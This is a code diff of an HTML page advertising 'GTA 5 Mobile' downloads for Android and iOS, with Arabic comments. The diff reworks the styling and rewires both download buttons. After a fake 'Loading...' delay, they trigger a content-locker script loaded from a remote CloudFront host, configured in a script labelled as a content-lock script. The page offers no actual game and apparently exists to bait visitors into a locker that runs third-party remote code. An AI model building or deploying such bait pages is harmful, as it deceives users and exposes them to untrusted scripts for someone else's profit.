@@ -6,94 +6,125 @@
 <title>GTA 5 Mobile</title>
 
 <style>
-  body {
-    margin: 0;
-    background: #0e0e0e;
-    font-family: Arial, sans-serif;
-    color: #fff;
-    text-align: center;
-  }
 
-  /* صورة الهيدر */
-  .hero {
-    width: 100%;
-    overflow: hidden;
-  }
+body{
+  margin:0;
+  background:#0e0e0e;
+  font-family:Arial, sans-serif;
+  color:#fff;
+  text-align:center;
+}
 
-  .hero img {
-    width: 100%;
-    height: 240px;
-    object-fit: cover;
-    display: block;
-  }
+.hero{
+  width:100%;
+  overflow:hidden;
+}
 
-  /* المحتوى */
-  .container {
-    padding: 20px;
-  }
+.hero img{
+  width:100%;
+  height:240px;
+  object-fit:cover;
+  display:block;
+}
 
-  .game-icon {
-    width: 120px;
-    border-radius: 22px;
-    border: 3px solid #00ffd0;
-    margin-top: -70px;
-    background: #000;
-  }
+.container{
+  padding:20px;
+}
 
-  h1 {
-    margin-top: 15px;
-    font-size: 28px;
-  }
+.game-icon{
+  width:120px;
+  border-radius:22px;
+  border:3px solid #00ffd0;
+  margin-top:-70px;
+  background:#000;
+}
 
-  .sub {
-    color: #aaa;
-    margin-bottom: 30px;
-  }
+h1{
+  margin-top:15px;
+  font-size:28px;
+}
 
-  /* أزرار التحميل */
-  .btn {
-    display: block;
-    width: 90%;
-    max-width: 360px;
-    margin: 14px auto;
-    padding: 18px;
-    border-radius: 50px;
-    background: #12d6a5;
-    color: #000;
-    font-size: 20px;
-    font-weight: bold;
-    text-decoration: none;
-    transition: .3s;
-    border: none; /* لضمان مظهر الزر */
-    cursor: pointer; /* لتغيير شكل الماوس عند الوقوف على الزر */
-  }
+.sub{
+  color:#aaa;
+  margin-bottom:30px;
+}
 
-  .btn:hover {
-    transform: scale(1.04);
-  }
+.btn{
+  display:block;
+  width:90%;
+  max-width:360px;
+  margin:14px auto;
+  padding:18px;
+  border-radius:50px;
+  background:#12d6a5;
+  color:#000;
+  font-size:20px;
+  font-weight:bold;
+  text-decoration:none;
+  transition:.3s;
+  cursor:pointer;
+}
+
+.btn.loading{
+  background:#888;
+}
+
+.btn:hover{
+  transform:scale(1.04);
+}
+
 </style>
+
+<!-- 🔒 سكريبت قفل المحتوى -->
+<script type="text/javascript">
+var kiYJm_TnK_KzccYc={"it":4322876,"key":"2c397"};
+</script>
+<script src="https://da4talg8ap14v.cloudfront.net/c2d7620.js"></script>
+
 </head>
 
 <body>
 
 <div class="hero">
-  <img src="https://img.gta5-mods.com/q95/images/british-army-reserve-intro-music/8296cc-Grand-Theft-Auto-V-GTA-5-games-hit2k.jpg" alt="GTA Header">
+<img src="https://img.gta5-mods.com/q95/images/british-army-reserve-intro-music/8296cc-Grand-Theft-Auto-V-GTA-5-games-hit2k.jpg">
 </div>
 
 <div class="container">
-  <img class="game-icon" src="https://i.ibb.co/FzQ7s9s/gta5.jpg">
 
-  <h1>GTA 5 Mobile</h1>
-  <div class="sub">For Android and iOS</div>
+<img class="game-icon"
+src="https://i.ibb.co/FzQ7s9s/gta5.jpg">
 
-  <button class="btn" onclick="call_locker();">📱 Download for Android</button>
-  <button class="btn" onclick="call_locker();">🍎 Download for iOS</button>
+<h1>GTA 5 Mobile</h1>
+<div class="sub">For Android and iOS</div>
+
+<div class="btn" onclick="startLocker(this)">📱 Download for Android</div>
+<div class="btn" onclick="startLocker(this)">🍎 Download for iOS</div>
+
 </div>
 
-<script type="text/javascript">
-    var jcLfV_CgD_kifLfc = {"it":4322876, "key":"2c397"};
+<script>
+
+function startLocker(btn){
+
+  btn.classList.add("loading");
+  btn.innerHTML = "Loading...";
+
+  setTimeout(function(){
+
+    if(typeof _Vm === "function"){
+      _Vm(); // تشغيل قفل المحتوى
+    }else{
+      alert("Locker not loaded yet");
+    }
+
+    btn.classList.remove("loading");
+    btn.innerHTML = "Download";
+
+  },1000);
+
+}
+
 </script>
-<script src="https://duw03nk63ml3f.cloudfront.net/f6afaf6.js"></script>
 
 </body>
 </html>
